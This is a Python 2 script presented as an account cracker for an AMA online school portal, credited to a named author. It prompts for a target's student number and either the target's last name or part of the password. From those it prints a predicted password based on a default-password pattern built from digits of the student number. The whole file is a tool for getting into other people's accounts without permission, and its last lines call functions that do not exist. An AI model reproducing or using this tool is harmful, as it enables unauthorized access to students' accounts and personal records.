import os,time
W = '\033[1;37;40m'
Br = '\033[1;31;40m'
Bg = '\033[1;32;40m'
Y = '\033[1;33;40m'
Bb = '\033[1;34;40m'
Bm = '\033[1;35;40m'
Bc = '\033[1;36;40m'


	
b = "*"

q = Bg +"*" * 60
w = Y +"                Kto12.amauonline Account Cracker \n"
e = Br +"                        Created by:  \n"
t = Bg +"                    Edmark Jay Sumampen \n"
y = Y +"                         11-22-17 \n"
r = '\n'

v = '\n' + Bg + "*" * 60 + W
v1 = Bc + '\n1) Fast mode interface' + W
v2 = Y + '\n2) Prediction mode interface\n' + W
v25 = Br +'3) About \n'
v3 = Bg + "*" * 60 + W

def ac():
	os.system('clear')
	os.system('python2 aclclogo.py')
	print v + v1 + v2 + v25 + v3
	k = raw_input(Bm +'\n Select ' + Bc + '1' + Bm + ' or ' + Y +'2' + Bm +' Mode of Interface to Hack: ' + Bb)
	if k == '1':
		os.system('clear')
		nd2c()
		#os.system('python2 ama2.py')
	elif k == '2':
		os.system('clear')
		accc()
		#os.system('python2 ama.py')
	elif k == '3':
		os.system('clear')
		os.system('python2 about.py')
	else:
		print Br +" Invalid command! "
		time.sleep(2.0)
		os.system('clear')
		ac()

def accc():
	os.system('clear')
	os.system('python2 aclclogo.py')
	print Bc + ' Prediction mode Interface' + W
	print q + w + e + t + y + q + r
	u = raw_input(Bm +' Enter USN: ' + Y)
	p = raw_input(Bm +' Enter Target Last name: ' + Y)
	
	print '\n'
	print p +' Account Information:'
	print "=" * 60
	print Bc +" User: " + Bg + u
	print Bc +" Password: " + Bg + b + p[0] + b + u [8] + u [9] + u [10] + u [1] + u [2] + u [3]
	print Y +"=" * 60
	print main()

def nd2c():
	os.system('clear')
	os.system('python2 aclclogo.py')
	print Bc +' Fast mode Interface'
	print q + w + e + t + y + q + r
	u = raw_input(Bm +' Enter USN: ' + Y)
	p = raw_input(Bm +' Enter 3 first letter of Password: ' + Y)
	
	print '\n'
	print "=" * 60
	print Y +" User: " + Bg + u
	print Y +" Password: " + Bg + p + u [8] + u [9] + u [10] + u [1] + u [2] + u [3]
	print Y +"=" * 60
	print main()

def main():
	
	o = raw_input('\n Do you want to restart the program? (y/n): ')
	if o == 'y':
		os.system('clear')
		ac()
	elif o == 'n':
		print Br +' bye bye' + W
		exit()
		exit()
	elif o == 'clear':
		os.system('clear')
		main()
	else:
		print " idiot wrong command!"
		os.system('clear')
		main()
	

ac()
accc()
ndc2()
startc()

